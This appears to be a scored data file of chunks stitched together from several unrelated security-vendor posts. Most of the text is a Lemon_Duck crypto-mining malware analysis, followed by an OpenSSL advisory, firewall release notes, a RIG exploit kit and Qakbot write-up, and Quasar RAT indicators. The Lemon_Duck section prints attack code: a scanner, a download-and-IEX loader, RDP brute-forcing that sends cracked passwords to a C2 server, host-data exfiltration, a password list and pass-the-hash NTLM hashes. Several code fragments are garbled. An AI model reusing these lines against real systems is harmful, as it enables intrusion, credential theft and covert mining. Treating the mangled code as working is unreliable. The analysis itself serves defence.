"SophosLabs are monitoring a significant spike in crypto mining attacks, which spread quickly across enterprise networks. Starting from a single infection, these attacks use a variety of malicious scripts that, eventually, turn an enterprise’s large pool of CPU resources into efficient cryptocurrency mining slaves.",0.014755498766925168
"The threat actors behind these campaigns have been using an array of advanced techniques, including fileless script execution, leveraging open source security tools for nefarious purposes, and abuse of exploitable vulnerabilities to rapidly spread laterally to other machines within the same network.
In its latest iterations, the threat actor has begun to employ the use of EternalBlue exploits to propagate laterally to other machines in the same network. Some of the malicious scripts use the term “$Lemon_Duck” as a variable, so we (and a few other companies who have contemporaneously blogged about this same threat actor) have started to refer to these attackers as the Lemon_Duck PowerShell campaign.
In this post, we’ve turned our attention to what appears to be an organized campaign run by attackers who methodically and consistently upgrade their attack scripts with new offensive techniques. Most of the offensive modules used in this script are sourced from open source repositories; The malicious scripts maintain their persistence on infected Windows machines using Scheduled Tasks.
Target selection for crypto mining
This campaign randomly generates IP addresses for targeting, and port-scans for listening services on specific port numbers, such as 445/TCP (SMB), 1433/TCP (MS-SQL server), or 65529/TCP (A port used by a machine that has been previously compromised by this same threat actor).
Once the script gets a response from the remote machine, it probes the IP address for the EternalBlue SMB vulnerability or performs a brute-force attack against the MS-SQL service in an attempt to compromise the machine. Machines with listening ports open on 65529/TCP have previously been compromised by this or another threat actor using a similar script.
This section of the malicious script contains the logic by which it randomly generates target IP addresses:
function getipaddrs{
write-host ""Get ipaddress...""
$allip = @()
[string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90','10.1.10','10.10.1')
$regex = [regex]""\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b""    $regex.Matches((ipconfig /all)) | ForEach-Object {{{}}
if ($allip -notcontains $_.Value)
{ $allip {{+= $_.Value }}}
}
$regex.Matches((ipconfig /displaydns)) | ForEach-Object {{{}}
if ($allip -notcontains $_.Value)
{ $allip {{+= $_.Value }}}
}
$regex.Matches((netstat -ano)) | ForEach-Object {{{}}
if ($allip -notcontains $_.Value)
{ $allip {{+= $_.Value }}}
}    foreach($IP in $allip)
{{{}}
if ($IP.StartsWith(""127."") -or ($IP -match '25\d.') -or ($IP -match '24\d.') -or $IP.StartsWith(""0."") -or $IP.StartsWith(""169.254"") -or $IP -eq '1.0.0.127')
{{{}}
}else{
$iptemp = $ip.Split(""."")
$SubnetIP = $iptemp[0]  "".""   $iptemp[1]  "".""   $iptemp[2]
if ($ipsub -notcontains $SubnetIP)
{ $ipsub = @($SubnetIP) + $ipsub}
}
}",0.014873087900279192
"try{
$NetObject = New-Object Net.WebClient
$wlanip = $NetObject.DownloadString(""https://api.ipify.org/"")
$wlaniptemp = $wlanip.Split(""."")
$wlansub = $wlaniptemp[0]  "".""   $wlaniptemp[1]  "".""   $wlaniptemp[2]
if($ipsub -notcontains $wlansub)
{ $ipsub += $wlansub }
}catch",0.014458100954305109
"try{
$ipaddress = [System.Net.DNS]::GetHostByName($null).AddressList
$localip = @()
Foreach ($ip in $ipaddress)
{{{}}
$localip += $ip.IPAddressToString
$intiptemp = $ip.IPAddressToString.Split(""."")
if($intiptemp[0] -ne '127'){
$intipsub = $intiptemp[0]  "".""   $intiptemp[1]  "".""   $intiptemp[2]
if($ipsub -notcontains $intipsub)
{ $ipsub += $intipsub }
}
}
}catch",0.017296869008393556
"for($i=0; $i -lt 30; $i++){
try{
$ran_ipsub = """"(1(Get-Random -Maximum 254))"".""(1+(Get-Random -Maximum 254))"".""(1+(Get-Random -Maximum 254))
if($ipsub -notcontains $ran_ipsub){
$ipsub = """"(1+(Get-Random -Maximum 254))"".""(1+(Get-Random -Maximum 254))"".""(1+(Get-Random -Maximum 254))
}
}catch
}
$global:ipaddrs = @()
foreach($ipsub2 in $ipsub)
{{ {  }",0.019943572970340995
"}
write-host $ipsub2
$global:ipaddrs = 1..254|%{$ipsub2{}"".""+$_}
}
$global:ipaddrs = @($global:ipaddrs | Where-Object { $localip -notcontains $_ })
write-host ""Get address done!!""
}",0.010117666556304417
"And this portion of the script dictates how the attackers scan for specific listening ports on the targeted computers:
function localscan {
Param(
[int]$Port = 445
)
write-host ""scan port $port...""
[string[]]$openips = @()
$clients = @
$connects = @
foreach($ip in $ipaddrs) {
try{
$client = New-Object System.Net.Sockets.TcpClient
$connect = $client.BeginConnect($ip,$port,$null,$null)
$connects[}}{{$ip}}{{] = $connect
$clients[}}{{$ip}}{{] = $client
}catch
}
Start-Sleep -Milli 3000
foreach($ip in $clients.Keys) {
if ($clients[}}{{$ip}}{{].Connected) {
$clients[}}{{$ip}}{{].EndConnect($connects[}}{{$ip}}{{])
$openips += $ip
}
$clients[}}{{$ip}}{{].Close()
}
write-host $openips.count
return ,$openips
}
Finally, the attackers use a password & hash dictionary in an attempt to brute-force a Microsoft SQL server’s “sa” (super admin) account credentials. The script runs through a long list of passwords (including ones that have been used in the past by a variety of threat groups who spread Mirai and other IoT botnet malware. The attackers also use an array of NTLM hashes in a “pass the hash” attack.
Here’s the password list:
""saadmin"",""123456"",""password"",""PASSWORD"",""123.com"",""admin@123"",""Aa123456"",""qwer12345"",""Huawei@123"",""123@abc"",""golden"",""123!@#qwe"",""1qaz@WSX"",""Ab123"",""1qaz!QAZ"",""Admin123"",""Administrator"",""Abc123"",""Admin@123"",
""999999"",""Passw0rd"",""123qwe!@#"",""football"",""welcome"",""1"",""12"",""21"",""123"",""321"",""1234"",""12345"",""123123"",""123321"",""111111"",""654321"",""666666"",""121212"",""000000"",""222222"",""888888"",""1111"",""555555"",""1234567"",""12345678"",
""123456789"",""987654321"",""admin"",""abc123"",""abcd1234"",""abcd@1234"",""abc@123"",""p@ssword"",""P@ssword"",""p@ssw0rd"",""P@ssw0rd"",""P@SSWORD"",""P@SSW0RD"",""P@w0rd"",""P@word"",""iloveyou"",""monkey"",""login"",""passw0rd"",""master"",""hello"",
""qazwsx"",""password1"",""qwerty"",""baseball"",""qwertyuiop"",""superman"",""1qaz2wsx"",""fuckyou"",""123qwe"",""zxcvbn"",""pass"",""aaaaaa"",""love"",""administrator"",""qwe1234A"",""qwe1234a"",""123123123"",""1234567890"",""88888888"",""111111111"",
""112233"",""a123456"",""123456a"",""5201314"",""1q2w3e4r"",""qwe123"",""a123456789"",""123456789a"",""dragon"",""sunshine"",""princess"",""!@#$%^&*"",""charlie"",""aa123456"",""homelesspa"",""1q2w3e4r5t"",""sa"",""sasa"",""sa123"",""sql2005"",""sa2008"",
""abc"",""abcdefg"",""sapassword"",""Aa12345678"",""ABCabc123"",""sqlpassword"",""sql2008"",""11223344"",""admin888"",""qwe1234"",""A123456""
And this is the script’s NTLM hash collection
""31d6cfe0d16ae931b73c59d7e0c089c0"",""32ed87bdb5fdc5e9cba88547376818d4"",""8846f7eaee8fb117ad06bdd830b7586c"",""7b592e4f8178b4c75788531b2e747687"",""afffeba176210fad4628f0524bfe1942"",
""579da618cfbfa85247acf1f800a280a4"", ""47bf8039a8506cd67c524a03ff84ba4e"",""5ae7b89b3afea28d448ed31b5c704289"",""3f9f5f112da330ac4c20be279c6addfa"",""73f5d97549f033374fa6d9f9ce247ffd"",
""6f12c0ab327e099821bd938f39faab0d"",""e5ae562ddfaa6b446c32764ab1ebf3ed"", ""161cff084477fe596a5db81874498a24"",""d30c2ef8389ac9e8516baacb29463b7b"",""bc007082d32777855e253fd4defe70ee"",
""e45a314c664d40a227f9540121d1a29d"",""d144986c6122b1b1654ba39932465528"",""f4bb18c1165a89248f9e853b269a8995"", ""570a9a65db8fba761c1008a51d4c95ab"",""e1a692bd23bde99b327756e59308b4f8"",
""a87f3a337d73085c45f9416be5787d86"",""00affd88fa323b00d4560bf9fef0ec2f"",""31fc0dc8f7dfad0e8bd7ccc3842f2ce9"",""674e48b68c5cd0efd8f7e5faa87b3d1e"", ""69943c5e63b4d2c104dbbcc15138b72b"",
""588feb889288fb953b5f094d47d1565c"",""bcdf115fd9ba99336c31e176ee34b304"",""3dbde697d71690a769204beb12283678"",""df54de3f3438343202c1dd523d0265be"",""7ce21f17c0aee7fb9ceba532d0546ad6"",
""7a21990fcd3d759941e45c490f143d5f"",""579110c49145015c47ecd267657d3174"",""af27efb60c7b238910efe2a7e0676a39"",""2d7f1a5a61d3a96fb5159b5eef17adc6"",""4057b60b514c5402dde3d29a1845c366"",
""e8cd0e4a9e89eab931dc5338fcbec54a"", ""6920c58d0df184d829189c44fafb7ece"",""3fa45a060bd2693ae4c05b601d05ca0c"",""ba07ba35933e5bf42dea4af8add09d1e"",""f1351ac828428d74f6da2968089fc91f"",
""e84d037613721532e6b6d84d215854b6"",""2f2d544c53b3031f24d63402ea7fb4f9"", ""328727b81ca05805a68ef26acb252039"",""259745cb123a52aa2e693aaacca2db52"",""c22b315c040ae6e0efee3518d830362b"",
""162e829be112225fedf856e38e1c65fe"",""209c6174da490caeb422f3fa5a7ae634"",""f9e37e83b83c47a93c2f09f66408631b"", ""b3ec3e03e2a202cbd54fd104b8504fef"",""4ed91524cb54eaacc17a185646fb7491"",
""aa647b916a1fad374df9c30711d58a7a"",""a80c9cc3f8439ada25af064a874efe2d"",""13b29964cc2480b4ef454c59562e675c"",""de26cce0356891a4a020e7c4957afc72"", ""e19ccf75ee54e06b06a5907af13cef42"",
""30fcaa8ad9a496b3e17f7fbfacc72993"",""41630abb825ca50da31ce1fac1e9f54d"",""f56a8399599f1be040128b1dd9623c29"",""2e4dbf83aa056289935daea328977b20"",""b963c57010f218edc2cc3c229b5e4d0f"",
""f2477a144dff4f216ab81f2ac3e3207d"",""e6bd4cdb1e447131b60418f31d0b81d6"",""b9f917853e3dbf6e6831ecce60725930"",""6d3986e540a63647454a50e26477ef94"",""066ddfd4ef0e9cd7c256fe77191ef43c"",
""152efbcfafeb22eabda8fc5e68697a41"", ""5835048ce94ad0564e29a924a03510ef"",""2d20d252a479f485cdf5e171d93985bf"",""320a78179516c385e35a93ffa0b1c4ac"",""0d757ad173d2fc249ce19364fd64c8ec"",
""72f5cfa80f07819ccbcfb72feb9eb9b7"",""f67f5e3f66efd7298be6acd32eeeb27c"", ""1c4ecc8938fb93812779077127e97662"",""ad70819c5bc807280974d80f45982011"",""a836ef24f0a529688be2af1479a95411"",
""36aa83bdcab3c9fdaf321ca42a31c3fc"",""acb98fd0478427cd18949050c5e87b47"",""85deeec2d12f917783b689ae94990716"", ""a4141712f19e9dd5adf16919bb38a95c"",""e7380ae8ef85ae55bdceaa59e418bd06"",
""81e5f1adc94dd08b1a072f9c1ae3dd3f"",""71c5391067de41fad6f3063162e5eeff""
Suffice to say, if you run a public-internet-facing MS-SQL server, and you’re using one of these passwords, if your machine isn’t already compromised, it’s only a matter of time before it will be.
The Lemon_Duck kill-chain
Using the Windows Scheduled Tasks mechanism, the malicious scripts download and execute a fresh copy of the malicious script at one-hour intervals. The initial downloaded script performs validation of itself using a hardcoded hash before it executes. If that succeeds, the script downloads other payloads: a coin miner and an exploitation module.
This section of the script validates the checksum:
$tm1='$Lemon_Duck=''_T'';
$y=''_U'';$z=$y{}''p''{}'''$v''';
$m=(New-Object System.Net.WebClient).DownloadData($y);  // Downloaded SHA should be equal to 'd8109cec0a51719be6f411f67b3b7ec1'
[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach}{{$s+=$_.ToString(''x2'')};
if($s-eq''d8109cec0a51719be6f411f67b3b7ec1''){
IEX(-join[char[]]$m)
}
The $Lemon_Duck variable stores the filename of the task, and passes it to the command-and-control server in the User-Agent string. If everything checks out at this phase, the script begins to download the payloads.
Threat propagation and lateral spread
The script also attempts to propagate itself laterally, using the initially infected machine as a foothold into the rest of the network. To do this, it engages in a variety of methods, including the use of:",0.013137376061005512
"EternalBlue: Compromise through SMB exploitation (patch your boxes!)
USB & Network Drives: The script writes malicious Windows *.lnk shortcut files & malicious DLL files to removable storage connected to infected machines, and to mapped network drives (CVE-2017-8464)
Startup files: The script writes files to startup locations on the Windows filesystem (such as the Start Menu’s Startup folder) to execute during reboot.
MS-SQL Server brute-forcing – The script tries a variety of (really bad) passwords that might be used by the SQL Server “SA” user account.
Pass the Hash attack – Leverages the NTLM hashes from the table shown above
Execution of malicious commands on remote machines using WMI
RDP  Bruteforcing",0.008682506843433302
"In some of these attempted exploits, the script also creates one or more Scheduled Tasks to launch malicious scripts several minutes after the initial compromise. These tricks may be a rudimentary, ham-fisted attempt to evade behaviour-based security products. These types of security tools track the sequence and timing of events to identify attacks in progress and, theoretically, block an attack once a certain threshold of suspicious commands is issued within a short timeframe.
Once new scripts are downloaded from the malicious C&C server, the newer scripts remove the Scheduled Tasks entries created during the initial exploitation. Here are some examples of the propagation methods in use by this threat actor:
EternalBlue: The attacker’s scan machines that respond on 445/TCP to see if they are susceptible to the EternalBlue vulnerability using a tool called PingCastle.
The PingCastle EternalBlue vulnerability scanner
Machines found to be vulnerable to this exploit are then attacked using EternalBlue. The attack script also determines whether the vulnerable machine is running Windows 7 or older, or Windows 8 or newer versions.
try{
write-host ""start eb scanning...""
$vul=[PingCastle.Scanners.m17sc]::Scan($currip) // scan for vulnerable IP
if($vul{{) { }",0.011478194166278044
"}
write-host ""$currip seems eb vulnerable...""
$res = eb7 $currip $sc           //targeting win7 & older version
if($res) {
write-host ""$currip eb7 got it!!!""
} else {
$res = eb8 $currip $sc       //Windows 8, 10 & 2012
if($res) {
write-host ""$currip eb8 got it!!!""
}
}
}
}catch",0.007885052865045483
"After the attack script determines the version of the attack it will use, it launches the “SMB Exploitation Module” shown below.
EtrernalBlue attack code from the Lemon_Duck attack",0.007967980185468182
"LNK Remote Code Execution: The threat actors behind Lemon_Duck introduced a Windows shortcut *.lnk exploitation component in a recent update. The component exploits the CVE-2017-8464 vulnerability to spread by copying the malicious code to removable USB mass storage devices or network drives.
The script writes both a 32- and 64-bit version of a malicious DLL component, along with with with the corresponding *.lnk files, to the USB or network drive. When the user opens this drive in Windows Explorer or any other application that parses the .lnk Shortcut file, the shortcut executes the malicious DLL component.
The USBLNK component can spread to either FAT32 or NTFS file shares or removable storage devices
The script also creates a file named “UTFsync inf_data” – (file_location) as a reference marker to confirm that the drive is already infected with  *.lnk & *.dll  component. The presence of this file confirms the drive is already infected, so they skip this drive from infecting again.
PassTheHash Attack: The script verifies the user account privileges. If the user has administrator privileges, then the script invokes Dave Kennedy’s PowerDump module and Benjamin Delpy’s Mimikatz to dump all the NTLM hashes, Username, Password, and domain information. The script later uses those credentials to upload the malicious script files, followed by associated batch or *.lnk file, to the %startup% folder on any remote machines it can access in the network, or execute the PowerShell code remotely using WMI.
PowerDump Module: This module looks very similar to an open source script used for penetration testing and features two additional open-source scripting tools.
The malware uses the credentials harvested using Mimikatz to invoke the following PowerShell modules originally published by Kevin Robertson.",0.012017346658878214
"“Invoke-SE” – to execute the malicious batch command in the remote machine.
“Invoke-SMBC”  – “List” the IPC$ shares of all user, which are maintained by the SMB. It performs three different operations “List”, “Put” and “Delete”.",0.009845994401360358
"The malicious script invokes several open-source penetration testing tool PowerShell scripts
MS-SQL server brute-forcing: The script portscans active IP addresses and enumerates any machine with an open port 1433/TCP, the port used by the Microsoft SQL service, and then engages in a brute-force attack against the “SA” user account, using the list of the passwords shown above, along with any password collected locally from the machine using Mimikatz.
Upon a successful compromise of the MS-SQL server account, the script uses the sqlserver.exe process to execute malicious commands against other machines.
The Lemon_Duck MS-SQL server attack code
RDP brute-forcing:
The RDP module scans for open servers listening on the default RDP port 3389/TCP and will attempt to login with the “administrator” user name. The script will cycle through a list of hardcoded passwords using the “freerdp” open-source utility.on successful login, the malicious command is executed in the machine.
foreach($currip in $rdp_portopen[1]) {
$currip
if (($old_portopen -notcontains $currip) -and ($currip.length -gt 6)){
write-host ""start rdp scanning...""
foreach($password in $allpass){
write-host ""Try pass:$password""
$flag = (new-object RDP.BRUTE).check($exepath,$currip,""administrator"",$password,$false)
if($flag){
write-host ""SUCC!!""
$brute = new-object RDP.BRUTE
if($brute.check($exepath,$currip,""administrator"",$password,$true)){
(New-Object Net.WebClient).DownloadString($log_url+'/report.json?type=rdp&ip='+$currip+'&pass='+$password+'&t='+$t)
[RDP.CMD]::runCmd($rdp_code)
write-host ""Try to run command!!""
}
start-sleep 10
$brute.exit()
break;
}
}
}
}",0.010630029756969694
RDP Bruteforce Launching code,0.006601168900525534
"If the machine is been compromised with any of the above methods, the script modifies the Windows Firewall settings to open port 65529/TCP. It uses this indicator as a marker for the malicious script to identify that the machine is already compromised, so it will avoid reusing the exploitation modules on those machines.
This exploitation code runs continuously, with a 5-minute pause, every time it generates a new random IP address list. The script scans for the SMB & MS-SQL services to compromise the new machines. It also builds profiling information about the machine and passes it to its command-and-control server every time it runs this code.",0.009004705423479753
"Installation Tracking C2: This module only runs the first time a machine becomes compromised. This usually happens at the end of the kill chain, after executing all the downloaded modules for local exploitation, lateral movement, and the actual mining script. This module reports the machine profile back to its C2 server along with the status of each executed module.
write-host ""reporting""
try{
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
$comp_name = $env:COMPUTERNAME
$wf = test-path $env:tmp\wfreerdp.exe // RDP utility
$mf = test-path $env:tmp\mimi.dat // mimikatz
(New-Object Net.WebClient).DownloadString($log_url+'/log.json?V=0.1&ID='+$comp_name+'&GUID='+$guid+'&MAC='+$mac+'&retry='+$retry+'&pc1='+$portopen[1].count+'&pc2='+$ms_portopen[1].count+'&pc3='+$old_portopen[1].count+'&pc4='+$rdp_portopen[1].count+'&pci='+$ipaddrs_i.count+'&pco='+$ipaddrs_o.count+'&pcb='+$global:ipaddrs_b+'&mi='+($getpasswd -join ""^^"")+'&wf='+[Int]$wf+'&mf='+[Int]$mf)
}catch{}",0.010115792052961203
"Continuous Monitoring C2: An infected machine will continuously send reports back to the C2 server with the latest status of exploitation and mining modules. This module is executed after all the payload script modules have run. Among the parameters sent back to the C2 server are details about the compromised user accounts, machine configuration, user privilege and exploitation or mining payloads status.
hxxp://<redacted.com>/report.jsp?ID=HAWKINS-PC&GUID=2D3EC845-35CD-1346-876E-96257ADE6A2F&MAC=&OS=6.1.7601&BIT=32&USER=HAWKINS-PC$&DOMAIN=WORKGROUP&D=&CD=Standard%20VGA%20Graphics%20Adapter&P=1&FI=0&FM=0&IF=0&MF=0&HR=&UP=664.468&_T=1569808438.79244",0.00766588031899107
"Paramaters -
$comp_name = Computername
$guid = machine UUID
$mac = mac address of the machine
$os = installed OS version
$bit = 32 or 64 bit architecture
$user = username
$domain = User Domain
$uptime = system uptime
$card = Installed Graphic Card Name
$if_ = Exploit & threat progration module
$mf_ = active 32 or 64 bit mining module
$drive = removable & network drive information
$timestamp = Date in UFormat
$isA = If AMD Radeon graphic Card Installed & 64 bit machine
$permit - Is administrator
FI & IF - Confirm the threat propgation module is executed and running active
FM & MF - Confirm mining module executed and running active
&HR - Miner Hashrate information",0.010148687299441184
"Threat Prevalence
SophosLabs has monitored this malware communicating with its network and built a database of compromised machines. Based on the compromised machine count in the telemetry, we suspect that the attacks may have originated in Asia, but have spread to every continent.
Infected machines around the world, geolocated by their IP address
Percentages of the total number of Lemon_Duck infected endpoints, separated by country-code geolocation of the IP addresses",0.01393322008826925
"Detection Coverage
Sophos endpoint products will detect elements of the Lemon_Duck PowerShell components using some of the following definitions.",0.014337498739659726
"HPmal/PowDld-B – Core Miner Component.
Mal/PshlJob-A – Old campaign tasks files + Mssql brute-force task files.
Mal/MineJob-C – task files created by Eternal Blue Exploitation.
Mal/MineJob-B – Task file persistence.",0.016362038889242925
"Sophos Managed Threat Response (MTR) detects and neutralizes Techniques, Tactics and Procedures (TTPs) utilized by attackers throughout this report. These include but are not limited to PowerShell executions and download string IEX calls, brute force failed logins, start-up folder and scheduled task persistence, CVE-2017-8464, Open TCP 1433, pass-the-hash, and other malicious techniques.",0.01234563349128237
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
OpenSSL Man-in-the-Middle vulnerability: Sophos Product Status,0.009681065718096349
"Written by
Chris Weeds",0.008488617986944558
"June 10, 2014",0.008336890795314966
Cloud Network Products & Services Security Tips,0.00954688449136376
"On June 5th 2014, multiple new OpenSSL vulnerabilities were disclosed including CVE-2014-0224. Like the recent Heartbleed vulnerability this is a serious bug in the software responsible for encrypting traffic on the internet and is a widespread issue. Users are advised to ensure that their solutions are fully patched to protect against this bug. Fortunately, at the time of writing, there are no known in-the-wild attacks.",0.00992515117486148
"The CVE-2014-0224 vulnerability
This newly discovered vulnerability is linked to a flaw in the origin of the code in 1998. Almost all versions of OpenSSL are vulnerable, and if they are exploited it can result in communications being disclosed to a man-in-the-middle attack. However, the flaw relies on both the client and the server running vulnerable versions of OpenSSL and the server version being 1.0.1 or higher to be exploited. For more information on this threat, read our Naked Security article.
Sophos product status
Having audited all our solutions, we believe that only the below products are affected. We are working on fixes for all of them with the highest priority:",0.011202670581690222
"Sophos Cloud
Sophos UTM v9.2
Sophos UTM v9.1
Sophos UTM v8.3
SUM v4.1/4.2
Sophos Web Appliance v3.9.x.x
Sophos Email Appliance v3.7.x.x
PureMessage for UNIX",0.016081368107245808
"For further information on affected Sophos products, including patch availability, read the Knowledgebase article.
Many security products include OpenSSL for cryptographic functions and may also be vulnerable. Check with all of your security providers to be sure these flaws are being addressed.
How to stay secure
1. Patch early, patch often
A wide range of organizations are affected by this issue. Many programs will be issuing updates over the coming weeks. Watch out for the patches and apply them as soon as you can. As general best practice we always recommend ensuring your solutions are fully patched and up-to-date.
2. Always use a VPN and don’t trust open WiFi hotspots
In order to perform a man-in-the-middle attack the aggressor needs to be between you and the server you are communicating with. For most of us, this means we are most vulnerable when using unencrypted public WiFi. To avoid putting yourself at risk always use a VPN or a secure WiFi connection for important communications.",0.01207607395508592
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
Up2Date 7.305 Released,0.007926964455835295
"We have just started the release of Up2Date 7.305. This Up2Date is a stability/fix release which strengthens the reliability of the database system in AxG installations, adjusts the housekeeping tasks of the logging system, and provides a security fix.",0.010770096455968048
"Written by
Angelo Comazzetto",0.008855311348334505
"November 13, 2008",0.008611615929870697
Network up2date,0.007611986957109407
"We have just started the release of Up2Date 7.305. This Up2Date is a stability/fix release which strengthens the reliability of the database system in AxG installations, adjusts the housekeeping tasks of the logging system, and provides a security fix.",0.010770096455968048
"Note that this Up2Date requires a reboot once completed.
Remarks: Configuration will not be changed **NOTE**: System will be rebooted
News: – Improved overall database stability – Improved log cleaning process – Fixed libspf2 vulnerability CVE 2008-2469
Bug Fixes:
Fix [9274]: HA/Cluster system may deliver messages repeated several times
Fix [9324]: Resolved possible problem when resolving HA Master-Master situation
Fix [9372]: Resolved problem when disabling HA backup interface
All Up2Dates are GNUPG-signed! In regards to the new features and benefits of AxG 7.3, please read the V7.3 Release Notes PDF. The Astaro Up2Date technology makes it easy to upgrade your installed Astaro Security Gateway to the latest version. There are two ways to apply an Up2Date package to the system:
1) Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on then Watch Up2Date Progress in new window and an extra browser window will show the progress of the Up2Date installation and the System administrator will receive a notification email once the Up2Date process has finished successfully.
2) Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced: (Md5sum: 309803f7234f7e98f83252ef1b694247    Size: 61536873 bytes)",0.01061235017477058
"HTTP: Astaro US – Astaro US2 – Astaro Germany – Astaro Germany2 –  Japanese Mirror
FTP: Astaro US – Astaro US2 – Astaro Germany – Astaro Germany2 – Japanese Mirror",0.016244297904651206
"Feedback If you want to provide feedback or want to discuss any of the AxG V7 features you should post it on our User Bulletin Board. Please take care to add always(!) the version you refer to (e.g. ""[7.302] Quarantine Report ""). If you have feedback to our documentation (Online Help) please send it to docu@astaro.com. There is also a demo server: http://demo.astaro.com All Up2Dates are GNUPG-signed!
Your Astaro R&D team",0.013244443299961772
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Public Holidays Website Leads to RIG EK & Drive-by Download of Qakbot Malware,0.010390247177147982
"It is the beginning of 2016.  Most of us will be building our calendars around the year's public holidays. Many of us would of course use Google search to find these dates. But browsers beware, because one of the top results may result having your credentials and monies stolen by malware. The website in question: officeholidays[.]com, has been compromised and leads users to RIG exploit kit (EK).",0.01177953609310467
Compromised Website,0.009962110070377728
"If you were to search for the term ""public holidays"" on Google UK then the website officeholidays[.]com would currently appear to you in the top three results. This site currently has an estimated 1 million visitors per month according to SimilarWeb.",0.012711621043209775
"However, this site has been compromised and visitors are being silently redirected to malicious content that will drop malware onto their machines. During our analysis we saw the following malicious traffic occurring:",0.010833150841228378
Hand Crafted Javascript,0.008573995819311953
"What caught our attention and we believe is noteworthy is that a Javascript named slider.js has been included into officeholidays[.]com. This Javascript file does not seem to be a legitimate one that is used by the site. It has been included in such a way that it looks completely legitimate. This does not seem indicative of an automatic process that injects code into compromised websites. This is the behavior which we normally see. Instead, it seems likely to have been hand crafted and by someone who has taken the time to understand the code formatting and resource inclusions of the website.",0.009222901756184454
"Ultimately, we were silently redirected to an exploit kit called RIG. This attempts to find and exploit vulnerabilities on our system in order to execute malware.",0.009567892806361056
RIG Exploit Kit & Qakbot Payload,0.007745292435577866
"RIG EK was able to successfully exploit a vulnerability (CVE-2015-5122) in our Adobe Flash Player version 19.0.0.207. Interestingly though, we found that RIG EK would not successfully exploit some newer Flash Player versions such as 19.0.0.245, despite other exploit kits such as Angler being able to do so.",0.015938004907770198
"After successful exploitation a malware payload was downloaded from the RIG EK server. RIG is known to use a simple XOR on the payload and in this instance the XOR key was ""vwMKCwwA"".",0.02009602363066121
"The resulting malware was Qakbot (SHA1:8f01932de5c565fa6d559998cc1938ac5f23c264), which is a multi-capable credential theft trojan that steals passwords, certificates, cookies, browser traffic and anything it can get its hands on. It  has plenty of anti-VM capabilities as an attempt to prevent auto-analysis tools from executing the malicious code, as well as being able to spread to network shares and removable drives.",0.008469137948043715
"Qakbot will capture browser traffic to and from banking websites if they match on pre-defined URL patterns, such as those in the following snippet that we extracted during our analysis:",0.012542306039951656
"tdetreasury.tdbank.com
cmoltp.bbt.com
cashmanageronline.bbt.com
.hsbcnet.com
ebc_ebc
blilk.com
bankeft.com
cmol.bbt.com
securentrycorp.zionsbank.com
tmcb.zionsbank.com
.web-access.com
nj00-wcm
commercial.bnc.ca
/clkccm/
paylinks.cunet.org
e-facts.org
accessonline.abnamro.com
...",0.01633157760800097
Qakbot communicates with its command-and-control (C&C) infrastructure over HTTP(S) and uploads stolen data over FTP. We extracted the following C&Cs and FTP servers from this sample:,0.014191905700892016
"hxxps://mzvmmsedkr.biz/
hxxps://ewweorusgqoj.net/
hxxps://gdfqutzvshhgzheqksxj.biz/
hxxps://tsetndthrvsotsibqblhvkm.info/
hxxps://rkdxaovlaoltxnorwhtqo.com/",0.014170901398084967
"ftphost_1: 50.87.150.203
ftphost_2: 69.195.124.60
ftphost_3: 181.224.138.240
ftphost_4: 162.144.12.241",0.01567026388096937
"It is important to note that the FTP servers used here may be legitimate, but compromised servers.",0.012695268021642558
Customer Protection,0.009782250766576905
Forecepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:,0.006455238075894765
Stage 2 (Lure) - The malicious Javascript on the compromised website is detected and blocked.,0.012261757619156044
Stage 3 (Redirect) - The malicious redirection URL is detected and blocked.,0.012457263406573937
Stage 4 (Exploit Kit) - The RIG EK pages are identified and prevented from exploiting the user's browser.,0.014891873003518907
Stage 6 (Backchannel Traffic) - Attempts by the malware to contact its command-and-control server are detected and blocked.,0.01299315950696267
Summary,0.009602684635656611
"Exploit kit actors continue to look for popular websites to compromise in order to serve up malware, and in this instance the attackers have taken advantage of a perfect opportunity for compromising a public holidays website that is very popular at this time of year. The mere act of browsing to this website could result in significant financial and personal loss. Ensuring that your software is up to date will help to prevent these types of attacks from being able to execute malware on your system.
",0.012314125787319607
"Buggy implementation of CVE-2018-8373 vulnerability used to deliver Quasar RAT
A variant of a remote code execution vulnerability with Internet Explorer’s scripting engine known as CVE-2018-8373 patched last August has been found in the wild. Looking at the IOCs posted by our colleagues at TrendMicro, we recognized the infrastructure serving this exploit. The same static domain has been active since at least early July, and is being redirected to from an adult website injected with a malicious script.
In the below traffic capture from August, we were served CVE-2018-8174, which is thought to be from the same author. It is interesting to note that this is not an exploit kit, but rather appears to be a single actor who implemented the available Proof of Concept to distribute his payload, the Quasar Remote Administration Tool (RAT).",0.00987927981381953
"During our tests with this new variant of CVE-2018-8373, we found it to be quite unstable and failing to detonate its payload via Powershell invocation. However, a working CVE-2018-8174 was still serving the same payload we had captured back in August.",0.008178021793058377
"The source code for CVE-2018-8373 has been uploaded to many platforms already (PasteBin, VirusTotal), including to the AnyRun sandbox. That sample triggers the exploit and spawns PowerShell. In the following animation, we replayed this attack to show how our anti-exploit technology is able to mitigate this vulnerability at various levels.",0.008819632890275764
"We can expect that other treat actors will be looking at this code for possible implementation. However, unless it is improved, it is unlikely to be integrated into exploit kits, considering that its cousin, CVE-2018-8174, works flawlessly.
Indicators of compromise
Injected adult site
198.211.33[.]67
clubtubes[.]com
Exploit-serving domain
54.191.17[.]130
myswcd[.]com/vol/m3.html,CVE-2018-8373
myswcd[.]com/vol/m2.html,CVE-2018-8174
myswcd[.]com/vol/me.html,CVE-2018-8174
Payload
myswcd[.]com/vol/s1.exe,Loader
myswcd[.]com/vol/v1.exe,Installer
